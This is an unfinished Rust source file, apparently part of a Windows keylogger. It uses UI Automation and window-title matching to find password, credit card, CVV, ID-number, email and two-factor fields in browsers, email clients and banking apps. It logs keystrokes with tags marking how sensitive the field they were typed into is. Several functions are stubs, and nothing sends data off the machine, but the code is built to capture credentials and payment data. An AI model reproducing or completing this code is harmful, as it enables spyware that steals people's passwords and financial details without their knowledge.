// ==== WORK IN PROGRESS ====

use chrono::Utc;
use std::collections::HashMap;
use crate::utils::{get_active_process_info, is_sensitive_process, ActiveProcessInfo};

// Usar la crate windows para UI Automation
use windows::Win32::UI::Accessibility::*;
use windows::Win32::System::Com::*;
use windows::Win32::System::Ole::*;
use windows::Win32::System::Variant::*;
use windows::Win32::Foundation::*;
use std::ptr;
pub struct SensitiveFieldDetector {
    sensitive_fields: HashMap<String, FieldType>,
}

#[derive(Debug, Clone)]
pub enum FieldType {
    Password,
    Email,
    CreditCard,
    CVV,
    DNI,
    Phone,
    Address,
    Login,
    Registration,
    TwoFactor,
}

impl SensitiveFieldDetector {
    pub fn new() -> Self {
        Self {
            sensitive_fields: HashMap::new(),
        }
    }
    
    // Escanear la ventana activa en busca de campos sensibles
    pub fn scan_active_window(&mut self) -> Result<Vec<SensitiveField>, Box<dyn std::error::Error>> {
        let mut sensitive_fields = Vec::new();
        
        let process_info = get_active_process_info()?;
        
        // Solo escanear si es un proceso sensible
        if !is_sensitive_process(&process_info) {
            return Ok(sensitive_fields);
        }
        
        // Intentar usar UI Automation primero
        match self.scan_with_ui_automation(&process_info) {
            Ok(fields) => {
                sensitive_fields.extend(fields);
            },
            Err(e) => {
                println!("UI Automation failed: {}, using fallback", e);
                self.fallback_window_detection(&process_info, &mut sensitive_fields);
            }
        }
        
        Ok(sensitive_fields)
    }

    // Implementación de UI Automation para Windows
fn scan_with_ui_automation(&self, process_info: &ActiveProcessInfo) -> Result<Vec<SensitiveField>, Box<dyn std::error::Error>> {
        unsafe {
            // Initialize COM
            CoInitialize(None)?;

            let mut sensitive_fields = Vec::new();

            // Create instance of UI Automation
            let automation: IUIAutomation = CoCreateInstance(&UIAutomation::IID, None, CLSCTX_INPROC_SERVER)?;
            
            // Get the root element (desktop)
            let desktop = automation.GetRootElement()?;
            let focused_element = automation.GetFocusedElement()?;

            // Search for sensitive elements in the window
            self.find_sensitive_elements(&automation, &desktop, &mut sensitive_fields)?;

            // Cleanup COM
            CoUninitialize();

            Ok(sensitive_fields)
        }
    }
    
fn find_sensitive_elements(&self, automation: &IUIAutomation, element: &IUIAutomationElement, sensitive_fields: &mut Vec<SensitiveField>) -> Result<(), Box<dyn std::error::Error>> {
        unsafe {
            // Create a condition for Edit controls
            let property_id = UIA_ControlTypePropertyId;
            let variant = VARIANT::from(UIA_EditControlTypeId);
            let condition = automation.CreatePropertyCondition(property_id, &variant)?;

            let edit_elements = element.FindAll(TreeScope_Descendants, &condition)?;
            
            let count = edit_elements.Length()?;
            for i in 0..count {
                let edit_element = edit_elements.GetElement(i)?;
                
                if let Ok(field) = self.analyze_element(&edit_element) {
                    if self.is_password_field(&edit_element) {
                        let password_field = SensitiveField {
                            id: format!("password_{}", i),
                            field_type: FieldType::Password,
                            label: self.get_element_name(&edit_element).unwrap_or_else(|| "Password Field".to_string()),
                            value: "".to_string(),
                            is_focused: self.is_element_focused(&edit_element).unwrap_or(false),
                        };
                        sensitive_fields.push(password_field);
                    } else {
                        sensitive_fields.push(field);
                    }
                }
            }

            Ok(())
        }
    }


    fn is_password_field(&self, element: &IUIAutomationElement) -> bool {
        // Detectar campos de contraseña por nombre, clase o automation ID
        let name = self.get_element_name(element).unwrap_or_default().to_lowercase();
        let automation_id = self.get_element_automation_id(element).unwrap_or_default().to_lowercase();
        let class_name = self.get_element_class_name(element).unwrap_or_default().to_lowercase();
        
        let combined = format!("{} {} {}", name, automation_id, class_name);
        
        combined.contains("password") || 
        combined.contains("pwd") || 
        combined.contains("pass") ||
        combined.contains("secret") ||
        combined.contains("pin") ||
        name.starts_with("*") // Algunos campos de contraseña muestran asteriscos
    }
    
    fn analyze_element(&self, element: &IUIAutomationElement) -> Result<SensitiveField, Box<dyn std::error::Error>> {
        let name = self.get_element_name(element).unwrap_or_default();
        let automation_id = self.get_element_automation_id(element).unwrap_or_default();
        let class_name = self.get_element_class_name(element).unwrap_or_default();
        
        let field_type = self.determine_field_type(&name, &automation_id, &class_name);
        let is_focused = self.is_element_focused(element).unwrap_or(false);
        
        Ok(SensitiveField {
            id: automation_id.clone(),
            field_type,
            label: name,
            value: "".to_string(),
            is_focused,
        })
    }
    
    fn get_element_name(&self, element: &IUIAutomationElement) -> Option<String> {
        unsafe {
            element.CurrentName().ok()
                .map(|bstr| bstr.to_string())
        }
    }
    
    fn get_element_automation_id(&self, element: &IUIAutomationElement) -> Option<String> {
        unsafe {
            element.CurrentAutomationId().ok()
                .map(|bstr| bstr.to_string())
        }
    }
    
    fn get_element_class_name(&self, element: &IUIAutomationElement) -> Option<String> {
        unsafe {
            element.CurrentClassName().ok()
                .map(|bstr| bstr.to_string())
        }
    }
    


fn is_element_focused(&self, element: &IUIAutomationElement) -> Result<bool, Box<dyn std::error::Error>> {
 // TODO
 todo!("Implementar is_element_focused");
 }



 
    fn determine_field_type(&self, name: &str, automation_id: &str, class_name: &str) -> FieldType {
        let combined = format!("{} {} {}", name.to_lowercase(), automation_id.to_lowercase(), class_name.to_lowercase());
        
        if combined.contains("password") || combined.contains("pwd") || combined.contains("pass") {
            FieldType::Password
        } else if combined.contains("email") || combined.contains("mail") || combined.contains("@") {
            FieldType::Email
        } else if combined.contains("credit") || combined.contains("card") || combined.contains("cc") {
            FieldType::CreditCard
        } else if combined.contains("cvv") || combined.contains("cvc") || combined.contains("security") {
            FieldType::CVV
        } else if combined.contains("dni") || combined.contains("document") || combined.contains("id") {
            FieldType::DNI
        } else if combined.contains("phone") || combined.contains("tel") || combined.contains("mobile") {
            FieldType::Phone
        } else if combined.contains("address") || combined.contains("street") || combined.contains("city") {
            FieldType::Address
        } else if combined.contains("login") || combined.contains("user") || combined.contains("signin") {
            FieldType::Login
        } else if combined.contains("register") || combined.contains("signup") || combined.contains("create") {
            FieldType::Registration
        } else if combined.contains("2fa") || combined.contains("code") || combined.contains("token") {
            FieldType::TwoFactor
        } else {
            FieldType::Login // Default fallback
        }
    }
    
    // Detección mejorada basada en ventana y proceso
    fn fallback_window_detection(&self, process_info: &ActiveProcessInfo, sensitive_fields: &mut Vec<SensitiveField>) {
        let title_lower = process_info.window_title.to_lowercase();
        let process_lower = process_info.process_name.to_lowercase();
        
        // Detección por proceso específico
        if self.is_browser(&process_lower) {
            self.detect_browser_context(&title_lower, sensitive_fields);
        } else if self.is_email_client(&process_lower) {
            self.detect_email_context(&title_lower, sensitive_fields);
        } else if self.is_financial_app(&process_lower) {
            self.detect_financial_context(&title_lower, sensitive_fields);
        } else {
            // Detección genérica por título
            self.detect_generic_context(&title_lower, sensitive_fields);
        }
    }
    
    fn is_browser(&self, process_name: &str) -> bool {
        process_name.contains("chrome") || process_name.contains("firefox") || 
        process_name.contains("edge") || process_name.contains("opera") || 
        process_name.contains("brave")
    }
    
    fn is_email_client(&self, process_name: &str) -> bool {
        process_name.contains("outlook") || process_name.contains("thunderbird") || 
        process_name.contains("mail")
    }
    
    fn is_financial_app(&self, process_name: &str) -> bool {
        process_name.contains("bank") || process_name.contains("paypal") || 
        process_name.contains("wallet")
    }
    
    fn detect_browser_context(&self, title: &str, sensitive_fields: &mut Vec<SensitiveField>) {
        if title.contains("login") || title.contains("sign in") || title.contains("log in") {
            sensitive_fields.push(self.create_field(FieldType::Login, "Browser Login Form", title));
        } else if title.contains("register") || title.contains("sign up") || title.contains("create account") {
            sensitive_fields.push(self.create_field(FieldType::Registration, "Browser Registration Form", title));
        } else if title.contains("checkout") || title.contains("payment") || title.contains("billing") {
            sensitive_fields.push(self.create_field(FieldType::CreditCard, "Payment Form", title));
        } else if title.contains("gmail") || title.contains("outlook") || title.contains("yahoo") {
            sensitive_fields.push(self.create_field(FieldType::Email, "Email Service", title));
        } else if title.contains("facebook") || title.contains("twitter") || title.contains("instagram") {
            sensitive_fields.push(self.create_field(FieldType::Login, "Social Media", title));
        }
    }
    
    fn detect_email_context(&self, title: &str, sensitive_fields: &mut Vec<SensitiveField>) {
        if title.contains("compose") || title.contains("new message") {
            sensitive_fields.push(self.create_field(FieldType::Email, "Email Composition", title));
        } else if title.contains("login") || title.contains("password") {
            sensitive_fields.push(self.create_field(FieldType::Password, "Email Login", title));
        }
    }
    
    fn detect_financial_context(&self, title: &str, sensitive_fields: &mut Vec<SensitiveField>) {
        sensitive_fields.push(self.create_field(FieldType::CreditCard, "Financial Application", title));
    }
    
    fn detect_generic_context(&self, title: &str, sensitive_fields: &mut Vec<SensitiveField>) {
        if title.contains("password") {
            sensitive_fields.push(self.create_field(FieldType::Password, "Password Field", title));
        } else if title.contains("login") || title.contains("sign in") {
            sensitive_fields.push(self.create_field(FieldType::Login, "Login Form", title));
        } else if title.contains("register") || title.contains("sign up") {
            sensitive_fields.push(self.create_field(FieldType::Registration, "Registration Form", title));
        }
    }
    
    fn create_field(&self, field_type: FieldType, context: &str, title: &str) -> SensitiveField {
        SensitiveField {
            id: "window_detection".to_string(),
            field_type,
            label: format!("{}: {}", context, title),
            value: "".to_string(),
            is_focused: true,
        }
    }
}

#[derive(Debug, Clone)]
pub struct SensitiveField {
    pub id: String,
    pub field_type: FieldType,
    pub label: String,
    pub value: String,
    pub is_focused: bool,
}

pub struct LogEntry {
    pub timestamp: chrono::DateTime<Utc>,
    pub event_type: EventType,
    pub process_name: String,
    pub window_title: String,
    pub content: String,
    pub sensitive_context: Option<Vec<SensitiveField>>,
}

#[derive(Debug)]
pub enum EventType {
    Keystroke,
    MouseClick,
    SensitiveFieldDetected,
}

impl LogEntry {
    pub fn new_keystroke(key: &str, process: &str, window: &str) -> Self {
        Self {
            timestamp: Utc::now(),
            event_type: EventType::Keystroke,
            process_name: process.to_string(),
            window_title: window.to_string(),
            content: key.to_string(),
            sensitive_context: None,
        }
    }
    
    pub fn with_sensitive_context(mut self, fields: Vec<SensitiveField>) -> Self {
        if !fields.is_empty() {
            self.event_type = EventType::SensitiveFieldDetected;
        }
        self.sensitive_context = Some(fields);
        self
    }
}

pub fn write_log(entry: LogEntry) {
    let sensitivity_level = classify_sensitivity(&entry);
    
    match sensitivity_level {
        SensitivityLevel::High => {
            write_encrypted_log(&entry, EncryptionLevel::Maximum);
        },
        SensitivityLevel::Medium => {
            write_encrypted_log(&entry, EncryptionLevel::Standard);
        },
        SensitivityLevel::Low => {
            write_standard_log(&entry);
        },
    }
    
    println!("[{}] [{}] {}: {}", 
        entry.timestamp.format("%Y-%m-%d %H:%M:%S"),
        format!("{:?}", entry.event_type),
        entry.process_name,
        entry.content
    );
    
    if let Some(ref sensitive_fields) = entry.sensitive_context {
        for field in sensitive_fields {
            println!("  ⚠️  SENSITIVE: {:?} - {}", field.field_type, field.label);
        }
    }
}

#[derive(Debug)]
enum SensitivityLevel {
    High,
    Medium,
    Low,
}

#[derive(Debug)]
enum EncryptionLevel {
    Maximum,
    Standard,
}

fn classify_sensitivity(entry: &LogEntry) -> SensitivityLevel {
    if let Some(ref fields) = entry.sensitive_context {
        for field in fields {
            match field.field_type {
                FieldType::Password | FieldType::CreditCard | FieldType::CVV | FieldType::DNI => {
                    return SensitivityLevel::High;
                },
                FieldType::Email | FieldType::Phone | FieldType::Address => {
                    return SensitivityLevel::Medium;
                },
                _ => {}
            }
        }
    }
    SensitivityLevel::Low
}

fn write_encrypted_log(entry: &LogEntry, level: EncryptionLevel) {
    println!("📝 ENCRYPTED LOG ({:?}): Sensitive data detected", level);
}

fn write_standard_log(entry: &LogEntry) {
    println!("📝 STANDARD LOG: Regular keylog entry");
}
